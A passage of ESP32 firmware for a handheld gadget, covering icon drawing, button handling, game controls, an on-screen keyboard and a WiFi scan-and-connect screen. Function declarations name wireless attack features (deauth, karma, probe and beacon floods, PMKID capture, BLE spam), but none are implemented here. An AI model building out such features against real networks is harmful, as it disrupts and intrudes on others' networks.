    case 12: tft.fillRect(x+1,y+7,2,4,color); tft.fillRect(x+4,y+4,2,7,color); tft.fillRect(x+7,y+6,2,5,color); tft.fillRect(x+10,y+2,2,9,color); tft.drawLine(x+1,y+5,x+5,y+3,TFT_YELLOW); tft.drawLine(x+5,y+3,x+9,y+5,TFT_YELLOW); tft.drawLine(x+9,y+5,x+11,y+1,TFT_YELLOW); break;
    case 13: tft.drawCircle(x+3,y+3,2,color); tft.drawCircle(x+9,y+9,2,color); tft.drawLine(x+4,y+4,x+8,y+8,color); tft.drawPixel(x+6,y+6,color); break;
    case 14: tft.drawCircle(x+6,y+6,5,color); tft.drawCircle(x+6,y+6,3,color); tft.fillCircle(x+6,y+6,1,color); tft.drawLine(x+6,y+6,x+10,y+2,color); break;
    case 15: tft.drawCircle(x+6,y+6,3,color); tft.drawCircle(x+6,y+6,5,color); tft.drawPixel(x+6,y,color); tft.drawPixel(x+6,y+11,color); tft.drawPixel(x,y+6,color); tft.drawPixel(x+11,y+6,color); break;
    case 16: tft.drawRect(x+1,y,11,12,color); tft.drawLine(x+3,y+4,x+4,y+5,TFT_GREEN); tft.drawLine(x+4,y+5,x+3,y+6,TFT_GREEN); tft.drawFastHLine(x+6,y+7,4,TFT_GREEN); break;
    case 17: tft.drawRect(x+1,y,11,12,color); tft.drawLine(x+4,y+3,x+4,y+9,color); tft.drawLine(x+4,y+3,x+8,y+3,color); tft.drawLine(x+8,y+3,x+9,y+4,color); tft.drawLine(x+9,y+4,x+9,y+5,color); tft.drawLine(x+9,y+5,x+8,y+6,color); tft.drawLine(x+8,y+6,x+4,y+6,color); tft.drawLine(x+8,y+6,x+9,y+7,color); tft.drawLine(x+9,y+7,x+9,y+8,color); tft.drawLine(x+9,y+8,x+8,y+9,color); tft.drawLine(x+8,y+9,x+4,y+9,color); break;
    case 20: tft.fillRect(x+2,y+2,4,4,color); tft.fillRect(x+6,y+2,4,4,color); tft.fillRect(x+6,y+6,4,4,color); break;
    case 21: tft.fillRect(x+1,y+9,10,2,color); tft.fillCircle(x+6,y+4,2,color); break;
    case 22: tft.fillRect(x+1,y+5,3,3,color); tft.fillRect(x+4,y+5,3,3,color); tft.fillRect(x+7,y+5,3,3,color); tft.fillRect(x+7,y+2,3,3,color); break;
    case 23: tft.fillTriangle(x+1,y+4,x+5,y+4,x+2,y+7,color); tft.fillRect(x+4,y+3,6,6,color); tft.fillRect(x+8,y+1,3,3,color); tft.fillRect(x+8,y,5,3,color); tft.drawPixel(x+10,y+1,TFT_BLACK); tft.fillRect(x+13,y+1,1,1,color); tft.fillRect(x+5,y+9,2,2,color); tft.fillRect(x+8,y+9,2,2,color); break;
    case 24: tft.fillCircle(x+6,y+6,3,color); tft.fillTriangle(x+9,y+6,x+12,y+7,x+9,y+8,color); tft.drawPixel(x+7,y+5,TFT_BLACK); break;
    case 25: tft.drawRect(x+1,y+1,5,5,color); tft.drawRect(x+6,y+1,5,5,color); tft.drawRect(x+1,y+6,5,5,color); tft.fillRect(x+6,y+6,5,5,color); break;
    case 27: tft.fillCircle(x+6,y+6,4,color); tft.drawLine(x+6,y,x+6,y+2,color); tft.drawLine(x+6,y+10,x+6,y+12,color); tft.drawLine(x,y+6,x+2,y+6,color); tft.drawLine(x+10,y+6,x+12,y+6,color); tft.drawPixel(x+2,y+2,color); tft.drawPixel(x+10,y+10,color); tft.drawPixel(x+10,y+2,color); tft.drawPixel(x+2,y+10,color); tft.drawPixel(x+5,y+5,TFT_WHITE); break;
    case 28: tft.drawRoundRect(x+2,y+2,9,9,1,color); tft.fillCircle(x+4,y+4,1,color); tft.fillCircle(x+8,y+4,1,color); tft.fillCircle(x+6,y+6,1,color); tft.fillCircle(x+4,y+8,1,color); tft.fillCircle(x+8,y+8,1,color); break;
    case 29: tft.fillCircle(x+3,y+3,2,color); tft.fillRect(x+1,y+5,5,4,color); tft.fillRect(x+1,y+9,2,2,color); tft.fillRect(x+4,y+9,2,2,color); tft.fillRect(x+8,y+10,5,2,TFT_WHITE); break;
    case 30: tft.fillRect(x+2,y+10,8,2,color); tft.fillTriangle(x+3,y+10,x+5,y+6,x+7,y+6,color); tft.fillRect(x+5,y+6,2,4,color); tft.drawLine(x+6,y+6,x+6,y+2,color); tft.drawPixel(x+5,y+1,color); tft.drawPixel(x+7,y+1,color); tft.fillCircle(x+11,y+3,1,TFT_RED); break;
    case 31: tft.drawRect(x+1,y+1,10,10,color); tft.drawFastHLine(x+1,y+4,10,color); tft.drawFastHLine(x+1,y+8,10,color); tft.drawFastVLine(x+4,y+1,10,color); tft.drawFastVLine(x+8,y+1,10,color); tft.fillCircle(x+6,y+6,1,TFT_RED); break;
    case 32: tft.drawCircle(x+6,y+6,4,color); tft.drawCircle(x+6,y+6,2,color); tft.fillRect(x+5,y,2,2,color); tft.fillRect(x+5,y+10,2,2,color); tft.fillRect(x,y+5,2,2,color); tft.fillRect(x+10,y+5,2,2,color); tft.drawPixel(x+2,y+2,color); tft.drawPixel(x+10,y+2,color); tft.drawPixel(x+2,y+10,color); tft.drawPixel(x+10,y+10,color); break;
    case 50: tft.drawLine(x+4,y+1,x+4,y+11,color); tft.drawLine(x+4,y+1,x+8,y+3,color); tft.drawLine(x+8,y+3,x+8,y+5,color); tft.drawLine(x+8,y+5,x+4,y+6,color); tft.drawLine(x+4,y+6,x+8,y+7,color); tft.drawLine(x+8,y+7,x+8,y+9,color); tft.drawLine(x+8,y+9,x+4,y+11,color); tft.drawLine(x+9,y+6,x+12,y+6,color); tft.drawPixel(x+11,y+5,color); tft.drawPixel(x+11,y+7,color); break;
    case 51: tft.drawLine(x+3,y+1,x+3,y+11,color); tft.drawLine(x+3,y+1,x+7,y+3,color); tft.drawLine(x+7,y+3,x+7,y+5,color); tft.drawLine(x+7,y+5,x+3,y+6,color); tft.drawLine(x+3,y+6,x+7,y+7,color); tft.drawLine(x+7,y+7,x+7,y+9,color); tft.drawLine(x+7,y+9,x+3,y+11,color); tft.drawCircleHelper(x+9,y+6,3,0x0C,color); tft.drawCircleHelper(x+9,y+6,5,0x0C,color); break;
    case 60: tft.drawLine(x+2,y+3,x+6,y+6,color); tft.drawLine(x+6,y+6,x+2,y+9,color); tft.fillRect(x+8,y+9,4,1,color); break;
    case 61: tft.drawLine(x+5,y+2,x+3,y+2,color); tft.drawLine(x+3,y+2,x+3,y+5,color); tft.drawLine(x+3,y+5,x+1,y+6,color); tft.drawLine(x+1,y+6,x+3,y+7,color); tft.drawLine(x+3,y+7,x+3,y+10,color); tft.drawLine(x+3,y+10,x+5,y+10,color); tft.drawLine(x+7,y+2,x+9,y+2,color); tft.drawLine(x+9,y+2,x+9,y+5,color); tft.drawLine(x+9,y+5,x+11,y+6,color); tft.drawLine(x+11,y+6,x+9,y+7,color); tft.drawLine(x+9,y+7,x+9,y+10,color); tft.drawLine(x+9,y+10,x+7,y+10,color); break;
  }
}

char getKey() {
  unsigned long now = millis();
  int pins[4] = {BTN_UP, BTN_DOWN, BTN_LEFT, BTN_RIGHT};
  for (int i = 0; i < 4; i++) {
    if (digitalRead(pins[i]) == LOW) {
      delay(8);
      if (digitalRead(pins[i]) == LOW) {
        unsigned long t0 = millis();
        while (digitalRead(pins[i]) == LOW) { if (millis() - t0 > 300) break; delay(3); }
        unsigned long tNow = millis();
        if (waitingDouble[i] && (tNow - lastPressTime[i] < DOUBLE_WINDOW)) {
          waitingDouble[i] = false;
          if (i == 3) return 'E';
          if (i == 2) return 'X';
        } else { waitingDouble[i] = true; lastPressTime[i] = tNow; }
      }
    }
  }
  for (int i = 0; i < 4; i++) {
    if (waitingDouble[i] && (millis() - lastPressTime[i] >= DOUBLE_WINDOW)) {
      waitingDouble[i] = false;
      if (i == 0) return 'U'; if (i == 1) return 'D'; if (i == 2) return 'L'; if (i == 3) return 'R';
    }
  }
  return 0;
}
char mapGameAction(int physIdx) { uint8_t a = g_gameKeyMap.map[g_curGameIdx][physIdx]; if (a == 0) return 'U'; if (a == 1) return 'D'; if (a == 2) return 'L'; if (a == 3) return 'R'; return 0; }
char getGameKey() {
  int pins[4] = {BTN_UP, BTN_DOWN, BTN_LEFT, BTN_RIGHT};
  unsigned long now = millis();
  const unsigned long HOLD_DELAY = 200, REPEAT_INTERVAL = 80, DOUBLE_WINDOW_G = 400;
  static bool pressed[4] = {false,false,false,false};
  static unsigned long pressStart[4] = {0,0,0,0}, lastPress[4] = {0,0,0,0}, lastRepeat[4] = {0,0,0,0};
  for (int i = 0; i < 4; i++) {
    bool nowPressed = (digitalRead(pins[i]) == LOW);
    if (nowPressed && !pressed[i]) {
      delay(2); if (digitalRead(pins[i]) != LOW) continue;
      pressed[i] = true; pressStart[i] = now; lastRepeat[i] = now;
      if (i == 3 && (now - lastPress[3] < DOUBLE_WINDOW_G) && lastPress[3] > 0) { lastPress[3] = 0; return 'E'; }
      lastPress[i] = now; return mapGameAction(i);
    } else if (!nowPressed && pressed[i]) pressed[i] = false;
    else if (nowPressed && pressed[i]) {
      if (now - pressStart[i] < HOLD_DELAY) continue;
      if (now - lastRepeat[i] > REPEAT_INTERVAL) { lastRepeat[i] = now; return mapGameAction(i); }
    }
  }
  return 0;
}
char getTetrisKey() {
  int pins[4] = {BTN_UP, BTN_DOWN, BTN_LEFT, BTN_RIGHT};
  unsigned long now = millis();
  const unsigned long HOLD_DELAY=250, REPEAT_INTERVAL=100, ROTATE_DEBOUNCE=250, HARDROP_DEBOUNCE=300;
  static bool pressed[4]={false,false,false,false};
  static unsigned long pressStart[4]={0,0,0,0}, lastRepeat[4]={0,0,0,0}, lastPress[4]={0,0,0,0};
  static unsigned long lastRotate=0, lastHardDrop=0;
  for (int i=0;i<4;i++) {
    bool nowPressed = (digitalRead(pins[i])==LOW);
    if (nowPressed && !pressed[i]) {
      delay(3); if (digitalRead(pins[i])!=LOW) continue;
      pressed[i]=true; pressStart[i]=now; lastRepeat[i]=now;
      if (i==3 && (now-lastPress[3]<400) && lastPress[3]>0) { lastPress[3]=0; return 'E'; }
      lastPress[i]=now;
      if (i==0) return mapGameAction(0);
      if (i==1) return mapGameAction(1);
      if (i==2) { if (now-lastRotate>ROTATE_DEBOUNCE) { lastRotate=now; return mapGameAction(2); } return 0; }
      if (i==3) { if (now-lastHardDrop>HARDROP_DEBOUNCE) { lastHardDrop=now; return mapGameAction(3); } return 0; }
    } else if (!nowPressed && pressed[i]) pressed[i]=false;
    else if (nowPressed && pressed[i]) {
      if (i>=2) continue;
      if (now-pressStart[i]<HOLD_DELAY) continue;
      if (now-lastRepeat[i]>REPEAT_INTERVAL) { lastRepeat[i]=now; return mapGameAction(i); }
    }
  }
  return 0;
}
char getSnakeKey() {
  static bool prevState[4]={true,true,true,true}; static unsigned long lastPress[4]={0,0,0,0};
  static unsigned long lastRightTime = 0;
  int pins[4] = {BTN_UP, BTN_DOWN, BTN_LEFT, BTN_RIGHT};
  for (int i=0;i<4;i++) {
    bool nowPressed=(digitalRead(pins[i])==LOW);
    if (nowPressed && prevState[i] && (millis()-lastPress[i]>50)) {
      prevState[i]=false; lastPress[i]=millis();
      if (i==3) { if (lastRightTime>0 && millis()-lastRightTime<500) { lastRightTime=0; return 'E'; } lastRightTime=millis(); return mapGameAction(3); }
      return mapGameAction(i);
    } else if (!nowPressed && !prevState[i]) prevState[i]=true;
  }
  return 0;
}
// ★ Key Encoder：单击 RIGHT → 'X'（保存日志）；双击 RIGHT → 'E'（退出）；长按 LEFT → 'M'
char getKeyEncoder() {
  static unsigned long lastRightPress=0; static bool waitingRightDouble=false;
  unsigned long now=millis();
  if (digitalRead(BTN_UP)==LOW) { delay(20); if (digitalRead(BTN_UP)==LOW) { while (digitalRead(BTN_UP)==LOW) delay(5); return 'U'; } }
  if (digitalRead(BTN_DOWN)==LOW) { delay(20); if (digitalRead(BTN_DOWN)==LOW) { while (digitalRead(BTN_DOWN)==LOW) delay(5); return 'D'; } }
  if (digitalRead(BTN_LEFT)==LOW) { delay(20); if (digitalRead(BTN_LEFT)==LOW) { unsigned long start=millis(); bool longPress=false; while (digitalRead(BTN_LEFT)==LOW) { delay(5); if (!longPress && millis()-start>700) longPress=true; } return longPress?'M':'L'; } }
  if (digitalRead(BTN_RIGHT)==LOW) { delay(20); if (digitalRead(BTN_RIGHT)==LOW) { while (digitalRead(BTN_RIGHT)==LOW) delay(5); if (waitingRightDouble && (now-lastRightPress<700)) { waitingRightDouble=false; return 'E'; } waitingRightDouble=true; lastRightPress=now; } }
  if (waitingRightDouble && (now-lastRightPress>=700)) { waitingRightDouble=false; return 'X'; }
  return 0;
}
void waitExit() { while (true) { char k = getKey(); if (k == 'R' || k == 'E') return; delay(20); } }

void showIPScan(); void showDeauth(); void showKarma();
void showProbeFlood(); void showBeaconFlood(); void showPMKID(); void showSniffer();
void showKeyEncoder(); void showDeviceTracker(); void showBLEScan(); void showBLESpam();
void showChanGraph(); void showBleGatt(); void showTrackerDetect();
void showBleConnect(); void showBleBeConnected();
void showTetris(); void showBreakout(); void showSnake(); void showDinoRun();
void showFlappyBird(); void show2048(); void showMinesweeper();
void showRoguelike(); void showJump(); void showTowerDef(); void showGomoku();
void showGameMenu(); void showHackerMenu();
void showGameKeySetting(); void showKbLayoutSetting();
void showHackSettings(); void showToolsSettings();
void showAbout(); void showMemory(); void showLog(); void showLogView(); void showLogExport();
void showPetMenu(); void showPetWhale(); void showWifiConnect();
void showToolsMenu(); void showTerminal(); void showBasic();
void pet2DrawFish(int, int, uint8_t, bool);
void pet2DrawBar(int, const char*, uint8_t, uint16_t);
void logOverwrite(const char* title); void logAppend(const char* line);

void initRawWifi() {
  WiFi.mode(WIFI_OFF); delay(100);
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg); esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_STA); esp_wifi_start();
  esp_wifi_set_max_tx_power(80); wifiInited = true;
}

// ===== 软键盘 =====
#define KB_ROWS 3
#define KB_COLS 13
#define KB_TOTAL 39
#define KB_KEY_W 12
#define KB_KEY_H 12
#define KB_TOP_Y 44
#define KB_KEY_SHIFT 0x01
#define KB_KEY_ENTER 0x0A
const char KB_LOWER[KB_ROWS][KB_COLS] = {
  {'a','b','c','d','e','f','g','h','i','j','k','l','m'},
  {'n','o','p','q','r','s','t','u','v','w','x','y','z'},
  {'0','1','2','3','4','5','6','7','8','9', KB_KEY_SHIFT, ' ', KB_KEY_ENTER}
};
const char KB_UPPER[KB_ROWS][KB_COLS] = {
  {'A','B','C','D','E','F','G','H','I','J','K','L','M'},
  {'N','O','P','Q','R','S','T','U','V','W','X','Y','Z'},
  {'0','1','2','3','4','5','6','7','8','9', KB_KEY_SHIFT, ' ', KB_KEY_ENTER}
};
const char KB_QWERTY_ROW1[KB_COLS] = {'q','w','e','r','t','y','u','i','o','p','a','s','d'};
const char KB_QWERTY_ROW2[KB_COLS] = {'f','g','h','j','k','l','z','x','c','v','b','n','m'};
const char KB_PAGE1[10] = {'"','=','<','>','+','-','*','/','(',')'};
const char KB_PAGE2[10] = {',','.',';',':','?','!','\'','[',']','{'};
const char KB_PAGE3[10] = {'}','\\','|','~','@','#','$','%','^','&'};
int g_kbPos = 0, g_kbPage = 0;
bool g_kbCaps = false;
const uint8_t g_digit3x5[10][5] = {
  {0b111,0b101,0b101,0b101,0b111},{0b010,0b110,0b010,0b010,0b111},{0b111,0b001,0b111,0b100,0b111},
  {0b111,0b001,0b111,0b001,0b111},{0b101,0b101,0b111,0b001,0b001},{0b111,0b100,0b111,0b001,0b111},
  {0b111,0b100,0b111,0b101,0b111},{0b111,0b001,0b010,0b010,0b010},{0b111,0b101,0b111,0b101,0b111},
  {0b111,0b101,0b111,0b001,0b111}
};
char kbCellChar(int r, int c) {
  if (r < 2) { bool caps = g_kbCaps || (g_kbPage > 0);
    char ch = (g_kbLayout == 0) ? KB_LOWER[r][c] : ((r == 0) ? KB_QWERTY_ROW1[c] : KB_QWERTY_ROW2[c]);
    if (caps) ch = toupper(ch); return ch; }
  if (c == 10) return KB_KEY_SHIFT;
  if (c == 11) return ' ';
  if (c == 12) return KB_KEY_ENTER;
  switch (g_kbPage) { case 0: return KB_LOWER[2][c]; case 1: return KB_PAGE1[c]; case 2: return KB_PAGE2[c]; case 3: return KB_PAGE3[c]; }
  return '?';
}
void kbDrawPageIcon(int x, int y, int page, uint16_t color) {
  int num = page - 1; if (num < 0) num = 0; if (num > 3) num = 3;
  int px = x + 4, py = y + 3;
  for (int r = 0; r < 5; r++) { uint8_t bits = g_digit3x5[num + 1][r]; for (int c = 0; c < 3; c++) if (bits & (0b100 >> c)) tft.drawPixel(px + c, py + r, color); }
}
void kbDrawKey(int r, int c, bool sel) {
  int x = 2 + c * KB_KEY_W, y = KB_TOP_Y + r * KB_KEY_H;
  char ch = kbCellChar(r, c);
  uint16_t bg;
  if (sel) bg = TFT_BLUE;
  else if (ch == KB_KEY_ENTER) bg = 0x0400;
  else if (ch == ' ') bg = 0x4208;
  else if (ch == KB_KEY_SHIFT) { switch (g_kbPage) { case 0: bg = 0x4208; break; case 1: bg = 0x0010; break; case 2: bg = 0x4008; break; case 3: bg = 0x0200; break; } }
  else bg = TFT_DARKGREY;
  tft.fillRect(x, y, KB_KEY_W - 1, KB_KEY_H - 1, bg);
  if (sel) tft.drawRect(x, y, KB_KEY_W - 1, KB_KEY_H - 1, TFT_YELLOW);
  uint16_t fg = sel ? TFT_YELLOW : TFT_WHITE;
  if (ch == KB_KEY_SHIFT) { kbDrawPageIcon(x, y, g_kbPage + 1, fg); return; }
  if (ch == KB_KEY_ENTER) { tft.drawLine(x+7,y+3,x+7,y+8,fg); tft.drawLine(x+7,y+8,x+3,y+8,fg); tft.drawLine(x+3,y+8,x+5,y+6,fg); tft.drawLine(x+3,y+8,x+5,y+10,fg); return; }
  const char* lbl; static char buf[2];
  if (ch == ' ') lbl = "_"; else { buf[0] = ch; buf[1] = 0; lbl = buf; }
  tft.setTextColor(fg, bg); int w = strlen(lbl) * 6;
  tft.drawString(lbl, x + (KB_KEY_W - 1 - w) / 2, y + 2);
}
void kbDrawFull() { for (int r = 0; r < KB_ROWS; r++) for (int c = 0; c < KB_COLS; c++) kbDrawKey(r, c, r * KB_COLS + c == g_kbPos); }
void kbMoveCursor(int delta) { int oldPos = g_kbPos; g_kbPos = (g_kbPos + delta + KB_TOTAL) % KB_TOTAL; kbDrawKey(oldPos / KB_COLS, oldPos % KB_COLS, false); kbDrawKey(g_kbPos / KB_COLS, g_kbPos % KB_COLS, true); }

// ★ kbGetKey：一左选、二右选、三确定、四收起/退出（双击窗口 700ms）
char kbGetKey() {
  static bool upHeld=false; static unsigned long upStart=0, upLast=0;
  static bool dnHeld=false; static unsigned long dnStart=0, dnLast=0;
  static bool lHeld=false;  static unsigned long lStart=0; static bool lLong=false;
  static bool rHeld=false;  static unsigned long rStart=0, rLast=0;
  static bool rPending=false; static unsigned long rPendingTime=0;
  const unsigned long DBL = 700;
  unsigned long now = millis();

  bool upRead = (digitalRead(BTN_UP) == LOW);
  if (upRead && !upHeld) { delay(8); if (digitalRead(BTN_UP)==LOW) { upHeld=true; upStart=now; upLast=now; return 'L'; } }
  else if (!upRead && upHeld) upHeld = false;
  else if (upRead && upHeld && now-upStart>=300 && now-upLast>=60) { upLast=now; return 'L'; }

  bool dnRead = (digitalRead(BTN_DOWN) == LOW);
  if (dnRead && !dnHeld) { delay(8); if (digitalRead(BTN_DOWN)==LOW) { dnHeld=true; dnStart=now; dnLast=now; return 'R'; } }
  else if (!dnRead && dnHeld) dnHeld = false;
  else if (dnRead && dnHeld && now-dnStart>=300 && now-dnLast>=60) { dnLast=now; return 'R'; }

  bool lRead = (digitalRead(BTN_LEFT) == LOW);
  if (lRead && !lHeld) { delay(8); if (digitalRead(BTN_LEFT)==LOW) { lHeld=true; lStart=now; lLong=false; } }
  else if (!lRead && lHeld) { lHeld=false; if (!lLong) return 'E'; }
  else if (lRead && lHeld && !lLong && (now-lStart)>=700) { lLong=true; return 'A'; }

  bool rRead = (digitalRead(BTN_RIGHT) == LOW);
  if (rRead && !rHeld) {
    delay(8);
    if (digitalRead(BTN_RIGHT)==LOW) {
      rHeld = true; rStart = now; rLast = now;
      if (rPending && (now - rPendingTime) < DBL) { rPending = false; return 'X'; }
      rPending = true;
      rPendingTime = now;
    }
  } else if (!rRead && rHeld) {
    rHeld = false;
  } else if (rRead && rHeld && now - rStart >= 500 && now - rLast >= 60) {
    rLast = now; rPending = false; return 'D';
  }
  if (rPending && !rHeld && (now - rPendingTime) >= DBL) { rPending = false; return 'K'; }
  return 0;
}

// ==================================================
// ============== WiFi Connect（扫描优化版） ==============
// ==================================================
#define WC_MAX_APS  20
#define WC_LIST_ROWS 5
char wcPass[65]; int wcPassLen = 0;
char wcManualSSID[33]; int wcManualLen = 0;
struct WcApInfo { char ssid[33]; int rssi; int ch; bool enc; };
WcApInfo wcAps[WC_MAX_APS]; int wcApCount = 0;
int wcSelAp = 0, wcListOffset = 0;
uint16_t wcRssiColor(int rssi) { if (rssi > -60) return TFT_GREEN; if (rssi > -75) return TFT_YELLOW; return TFT_RED; }
void wcScanScreen() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("WiFi Connect", 2, 0);
  tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("R2x:back", 110, 0);
  tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawCentreString("Scanning...", 80, 30, 1);
  for (int i = 0; i < 5; i++) tft.fillCircle(70 + i * 5, 50, 2, TFT_DARKGREY);
}
// ★ 优化：射频稳定 + 同步扫描 + 自动重试
bool wcDoScan() {
  wcScanScreen();
  WiFi.mode(WIFI_OFF);
  delay(200);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(500);

  int n = 0;
  for (int attempt = 0; attempt < 3; attempt++) {
    n = WiFi.scanNetworks(false, false, false, 200);
    if (n > 0) break;
    WiFi.scanDelete();
    delay(400);
  }

  wcApCount = 0;
  if (n > 0) {
    for (int i = 0; i < n && wcApCount < WC_MAX_APS; i++) {
      String s = WiFi.SSID(i);
      if (s.length() == 0 || s.length() > 32) continue;
      strncpy(wcAps[wcApCount].ssid, s.c_str(), 32); wcAps[wcApCount].ssid[32] = 0;
      wcAps[wcApCount].rssi = WiFi.RSSI(i);
      wcAps[wcApCount].ch   = WiFi.channel(i);
      wcAps[wcApCount].enc  = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
      wcApCount++;
    }
    for (int i = 0; i < wcApCount - 1; i++)
      for (int j = i + 1; j < wcApCount; j++)
        if (wcAps[j].rssi > wcAps[i].rssi) { WcApInfo t = wcAps[i]; wcAps[i] = wcAps[j]; wcAps[j] = t; }
  }
  WiFi.scanDelete();
  return true;
}
void wcDrawList() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("WiFi Connect", 2, 0);
  tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("R2x:back", 110, 0);
  int total = wcApCount + 1;
  if (wcSelAp < wcListOffset) wcListOffset = wcSelAp;
  if (wcSelAp >= wcListOffset + WC_LIST_ROWS) wcListOffset = wcSelAp - WC_LIST_ROWS + 1;
  if (wcListOffset < 0) wcListOffset = 0;
  for (int i = 0; i < WC_LIST_ROWS; i++) {
    int idx = wcListOffset + i; if (idx >= total) break;
    int y = 12 + i * 12; bool sel = (idx == wcSelAp);
    if (sel) tft.fillRect(0, y - 1, 160, 12, 0x0010);
    tft.setTextColor(sel ? TFT_YELLOW : TFT_WHITE, sel ? 0x0010 : TFT_BLACK);
    if (idx < wcApCount) {
      char s[15]; strncpy(s, wcAps[idx].ssid, 14); s[14] = 0;
      tft.drawString((sel ? "> " : "  ") + String(s), 1, y);
      char rb[8]; snprintf(rb, sizeof(rb), "%d", wcAps[idx].rssi);
      tft.setTextColor(wcRssiColor(wcAps[idx].rssi), sel ? 0x0010 : TFT_BLACK);
      tft.drawString(rb, 106, y);
      if (wcAps[idx].enc) tft.drawString("[L]", 138, y);
    } else {
      tft.setTextColor(sel ? TFT_YELLOW : TFT_CYAN, sel ? 0x0010 : TFT_BLACK);
      tft.drawString((sel ? "> " : "  ") + String("[ Manual Input ]"), 1, y);
    }
  }
  tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("U/D L:ok R:scan", 2, 74);
}
bool wcPassScreen(const char* ssid, bool needPass) {
  if (!needPass) return true;
  wcPassLen = 0; wcPass[0] = 0;
  g_kbPos = 0; g_kbPage = 0; g_kbCaps = false;
  unsigned long lastBlink = 0;
  while (true) {
    tft.fillScreen(TFT_BLACK);
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    char hdr[32]; snprintf(hdr, sizeof(hdr), "%.14s", ssid); tft.drawString(hdr, 2, 0);
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("R2x:cancel", 110, 0);
    tft.fillRect(0, 12, 160, 12, TFT_NAVY);
    tft.setTextColor(TFT_YELLOW, TFT_NAVY); tft.drawString("P:", 1, 14);
    int sI = (wcPassLen > 20) ? wcPassLen - 20 : 0;
    int vL = wcPassLen - sI; if (vL > 20) vL = 20;
    char vis[21]; if (vL > 0) memcpy(vis, wcPass + sI, vL); vis[vL] = 0;
    tft.drawString(vis, 15, 14);
    int cx = 15 + vL * 6;
    if (((millis() / 500) & 1) == 0 && cx < 154) tft.fillRect(cx, 14, 6, 8, TFT_YELLOW);
    kbDrawFull();
    char k = kbGetKey();
    if (k == 'L') kbMoveCursor(-1);
    else if (k == 'R') kbMoveCursor(+1);
    else if (k == 'D') { if (wcPassLen > 0) wcPass[--wcPassLen] = 0; }
    else if (k == 'X' || k == 'K') return false;
    else if (k == 'A') { if (wcPassLen > 0) wcPass[--wcPassLen] = 0; }
    else if (k == 'E') {
      char ch = kbCellChar(g_kbPos / KB_COLS, g_kbPos % KB_COLS);
      if (ch == KB_KEY_SHIFT) { g_kbPage = (g_kbPage + 1) % 4; kbDrawFull(); }
      else if (ch == KB_KEY_ENTER) { if (wcPassLen > 0) return true; }
      else if (wcPassLen < 64) { wcPass[wcPassLen++] = ch; wcPass[wcPassLen] = 0; }
    }
    if (millis() - lastBlink > 500) { lastBlink = millis(); tft.fillRect(0, 12, 160, 12, TFT_NAVY);
      tft.setTextColor(TFT_YELLOW, TFT_NAVY); tft.drawString("P:", 1, 14);
      int s2 = (wcPassLen > 20) ? wcPassLen - 20 : 0; int v2 = wcPassLen - s2; if (v2 > 20) v2 = 20;
      char vis2[21]; if (v2 > 0) memcpy(vis2, wcPass + s2, v2); vis2[v2] = 0;
      tft.drawString(vis2, 15, 14);
      int cx2 = 15 + v2 * 6;
      if (((millis() / 500) & 1) == 0 && cx2 < 154) tft.fillRect(cx2, 14, 6, 8, TFT_YELLOW); }
    delay(15);
  }
}
bool wcManualInputScreen() {
  wcManualLen = 0; wcManualSSID[0] = 0;
  g_kbPos = 0; g_kbPage = 0; g_kbCaps = false;
  unsigned long lastBlink = 0;
  while (true) {
    tft.fillScreen(TFT_BLACK);
    tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Manual SSID", 2, 0);
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("R2x:cancel", 110, 0);
    tft.fillRect(0, 12, 160, 12, TFT_NAVY);
    tft.setTextColor(TFT_YELLOW, TFT_NAVY); tft.drawString("S:", 1, 14);
    int sI = (wcManualLen > 20) ? wcManualLen - 20 : 0;
    int vL = wcManualLen - sI; if (vL > 20) vL = 20;
    char vis[21]; memcpy(vis, wcManualSSID + sI, vL); vis[vL] = 0;
    tft.drawString(vis, 15, 14);
    int cx = 15 + vL * 6;
    if (((millis() / 500) & 1) == 0 && cx < 154) tft.fillRect(cx, 14, 6, 8, TFT_YELLOW);
    kbDrawFull();
    char k = kbGetKey();
    if (k == 'L') kbMoveCursor(-1);
    else if (k == 'R') kbMoveCursor(+1);
    else if (k == 'D') { if (wcManualLen > 0) wcManualSSID[--wcManualLen] = 0; }
    else if (k == 'X' || k == 'K') return false;
    else if (k == 'A') { if (wcManualLen > 0) wcManualSSID[--wcManualLen] = 0; }
    else if (k == 'E') {
      char ch = kbCellChar(g_kbPos / KB_COLS, g_kbPos % KB_COLS);
      if (ch == KB_KEY_SHIFT) { g_kbPage = (g_kbPage + 1) % 4; kbDrawFull(); }
      else if (ch == KB_KEY_ENTER) { if (wcManualLen > 0) return true; }
      else if (wcManualLen < 32) { wcManualSSID[wcManualLen++] = ch; wcManualSSID[wcManualLen] = 0; }
    }
    if (millis() - lastBlink > 500) { lastBlink = millis();
      tft.fillRect(0, 12, 160, 12, TFT_NAVY); tft.setTextColor(TFT_YELLOW, TFT_NAVY); tft.drawString("S:", 1, 14);
      int s2 = (wcManualLen > 20) ? wcManualLen - 20 : 0; int v2 = wcManualLen - s2; if (v2 > 20) v2 = 20;
      char vis2[21]; memcpy(vis2, wcManualSSID + s2, v2); vis2[v2] = 0;
      tft.drawString(vis2, 15, 14);
      int cx2 = 15 + v2 * 6;
      if (((millis() / 500) & 1) == 0 && cx2 < 154) tft.fillRect(cx2, 14, 6, 8, TFT_YELLOW); }
    delay(15);
  }
}
bool wcDoConnect(const char* ssid, const char* pass) {
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Connecting...", 2, 0);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  char buf[40]; snprintf(buf, sizeof(buf), "%.20s", ssid); tft.drawString(buf, 2, 20);
  WiFi.mode(WIFI_OFF); delay(100); WiFi.persistent(false);
